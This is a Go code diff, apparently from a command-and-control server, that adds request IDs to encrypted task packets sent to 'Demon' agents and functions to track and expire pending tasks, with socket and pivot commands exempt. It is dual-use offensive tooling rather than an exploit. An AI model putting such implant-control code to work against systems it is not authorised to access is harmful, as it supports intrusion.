@@ -30,6 +30,7 @@ func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
 		DataPayload        []byte
 		PayloadPackage     []byte
 		PayloadPackageSize = make([]byte, 4)
+		RequestID          = make([]byte, 4)
 		DataCommandID      = make([]byte, 4)
 	)
 
@@ -95,6 +96,9 @@ func BuildPayloadMessage(Jobs []Job, AesKey []byte, AesIv []byte) []byte {
 				break
 			}
 		}
+
+		binary.LittleEndian.PutUint32(RequestID, job.RequestID)
+		PayloadPackage = append(PayloadPackage, RequestID...)
 
 		binary.LittleEndian.PutUint32(DataCommandID, job.Command)
 		PayloadPackage = append(PayloadPackage, DataCommandID...)
@@ -502,6 +506,40 @@ func ParseDemonRegisterRequest(AgentID int, Parser *parser.Parser, ExternalIP st
 	} else {
 		logger.Debug(fmt.Sprintf("Agent: %x, Command: REGISTER, Invalid packet", AgentID))
 		return nil
+	}
+}
+
+// check that the request the agent is valid
+func (a *Agent) IsKnownRequestID(RequestID uint32, CommandID uint32) bool {
+	// some commands are always accepted because they don't follow the "send task and get response" format
+	switch CommandID {
+	case COMMAND_SOCKET:
+		return true
+	case COMMAND_PIVOT:
+		return true
+	}
+
+	for i := range a.Tasks {
+		if a.Tasks[i].RequestID == RequestID {
+			return true
+		}
+	}
+	return false
+}
+
+// the operator added a new request/command
+func (a *Agent) AddRequest(job Job) []Job {
+	a.Tasks = append(a.Tasks, job)
+	return a.Tasks
+}
+
+// after a request has been completed, we can forget about the RequestID so that it is no longer valid
+func (a *Agent) RequestCompleted(RequestID uint32) {
+	for i := range a.Tasks {
+		if a.Tasks[i].RequestID == RequestID {
+			a.Tasks = append(a.Tasks[:i], a.Tasks[i+1:]...)
+			break
+		}
 	}
 }
 
